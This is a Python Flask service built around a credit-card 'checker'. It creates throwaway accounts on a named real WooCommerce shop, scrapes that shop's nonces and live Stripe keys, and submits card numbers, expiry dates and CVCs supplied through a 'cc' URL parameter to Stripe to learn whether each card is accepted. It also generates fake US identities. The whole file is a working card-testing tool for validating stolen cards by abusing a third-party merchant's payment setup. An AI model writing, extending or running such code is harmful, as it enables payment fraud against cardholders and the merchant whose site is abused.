import os
import random
import re
import string
import time
import requests
from flask import Flask, jsonify, request
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from bs4 import BeautifulSoup # Although not directly used in the provided check function, it was in the previous script, so keeping it for completeness if needed.
from typing import Dict

app = Flask(__name__)

# --- Start of User's Original Script Logic (adapted for web service) ---

class USAddressGenerator:
    LOCATIONS = [
        {"city": "New York", "state": "NY", "zip": "10001", "state_full": "New York"},
        {"city": "Los Angeles", "state": "CA", "zip": "90001", "state_full": "California"},
        {"city": "Chicago", "state": "IL", "zip": "60601", "state_full": "Illinois"},
        {"city": "Houston", "state": "TX", "zip": "77001", "state_full": "Texas"},
        {"city": "Phoenix", "state": "AZ", "zip": "85001", "state_full": "Arizona"},
        {"city": "Philadelphia", "state": "PA", "zip": "19019", "state_full": "Pennsylvania"},
        {"city": "San Antonio", "state": "TX", "zip": "78201", "state_full": "Texas"},
        {"city": "San Diego", "state": "CA", "zip": "92101", "state_full": "California"},
        {"city": "Dallas", "state": "TX", "zip": "75201", "state_full": "Texas"},
        {"city": "Austin", "state": "TX", "zip": "78701", "state_full": "Texas"},
    ]
    
    FIRST_NAMES = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth", "David", "Barbara", "Richard", "Susan", "Jessica", "Thomas", "Sarah", "Charles", "Karen"]
    LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin"]
    STREETS = ["Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Pine St", "Elm St", "Washington Ave", "Lake St", "Hill St", "Park Ave"]
    
    @classmethod
    def generate_address(cls) -> Dict[str, str]:
        location = random.choice(cls.LOCATIONS)
        street_num = random.randint(100, 9999)
        street = random.choice(cls.STREETS)
        
        return {
            "first_name": random.choice(cls.FIRST_NAMES),
            "last_name": random.choice(cls.LAST_NAMES),
            "address": f"{street_num} {street}",
            "address_2": random.choice(["", f"Apt {random.randint(1, 50)}", f"#{random.randint(1, 100)}", ""]),
            "city": location["city"],
            "state": location["state"],
            "state_full": location["state_full"],
            "zip": location["zip"],
            "email": f"{random.choice(cls.FIRST_NAMES).lower()}{random.randint(1, 999)}@gmail.com"
        }

UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'

def check(card):
    s = requests.Session()
    s.mount('https://', HTTPAdapter(max_retries=Retry(total=3)))
    
    em = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"
    
    try:
        cc, mm, yy, cv = card.split('|')
        h = {'user-agent': UA, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}

        nc = None
        for _ in range(5):
            try:
                r1 = s.get('https://redbluechair.com/my-account/', headers=h, timeout=15)
                m = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', r1.text)
                if m: 
                    nc = m.group(1)
                    break
            except:
                pass
        
        if not nc: return {"st": "fail", "msg": "Nonce Error"}

        s.post('https://redbluechair.com/my-account/', headers=h, data={'email':em,'password':'Pass123!','woocommerce-register-nonce':nc,'register':'Register'})

        r2 = s.get('https://redbluechair.com/my-account/add-payment-method/', headers=h)

        sn = re.search(r'"createSetupIntentNonce"\s*:\s*"([a-zA-Z0-9]+)"', r2.text)
        pk = re.search(r'pk_live_[a-zA-Z0-9]+', r2.text)
        at = re.search(r'acct_[a-zA-Z0-9]+', r2.text)

        if not all([sn, pk, at]): return {"st": "fail", "msg": "Stripe Data Fetch Error"}

        h_s = {'authority': 'api.stripe.com', 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': UA}
        
        pay = f'billing_details[name]=+&billing_details[email]={em.replace("@", "%40")}&billing_details[address][country]=US&billing_details[address][postal_code]=10080&type=card&card[number]={cc}&card[cvc]={cv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F350609fece%3B+stripe-js-v3%2F350609fece%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fredbluechair.com&time_on_page=69770&client_attribution_metadata[client_session_id]=8389d56e-537f-457c-a11b-ff4bea7adf21&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=6fc8418e-d2e9-4ed9-9dea-c809747e44a0&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=6c6e46fb-ed66-4e96-ad1c-4601a6f97e390fbc51&muid=1738afd7-7425-4fc8-9b98-8282390d3df0e4ab79&sid=d98713dc-eff7-4bfb-887d-a344fff9c1b3898582&key={pk.group(0)}&_stripe_account={at.group(0)}'
        
        r3 = s.post('https://api.stripe.com/v1/payment_methods', headers=h_s, data=pay)
        pm = r3.json()
        if 'id' not in pm: return {"st": "fail", "msg": pm.get('error', {}).get('message', 'Stripe PM Error')}

        r4 = s.post('https://redbluechair.com/wp-admin/admin-ajax.php', headers=h, files={'action':(None,'create_setup_intent'),'wcpay-payment-method':(None,pm['id']),'_ajax_nonce':(None,sn.group(1))})
        return r4.json()
    except Exception as e: return {"st": "error", "msg": str(e)}

# --- End of User's Original Script Logic ---

@app.route('/api/razorpay/pay', methods=['GET'])
def razorpay_pay():
    cc_data = request.args.get('cc')
    
    if not cc_data:
        return jsonify({"error": "Missing 'cc' parameter. Usage: /api/razorpay/pay?cc=number|month|year|cvc"}), 400
    
    # Assuming the 'check' function is the core logic you want to expose
    # and it returns a dictionary with 'st' and 'msg'
    result = check(cc_data)
    
    # Map the bot result to a more standardized JSON response
    response_data = {
        "Gateway": "Stripe (via redbluechair.com)", # Based on the script's interaction
        "Price": "N/A", # The script doesn't explicitly define a price for the check
        "Response": result.get('msg', 'Unknown').replace(' ', '_').upper(),
        "Status": result.get('st') == 'success',
        "cc_input": cc_data # Echoing the input for clarity
    }
    
    # Further refine the 'Response' based on common patterns if needed
    if "declined" in response_data["Response"].lower():
        response_data["Response"] = "CARD_DECLINED"
    elif "success" in response_data["Response"].lower():
        response_data["Response"] = "SUCCESS"
    elif "error" in response_data["Response"].lower():
        response_data["Response"] = "ERROR"

    return jsonify(response_data)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
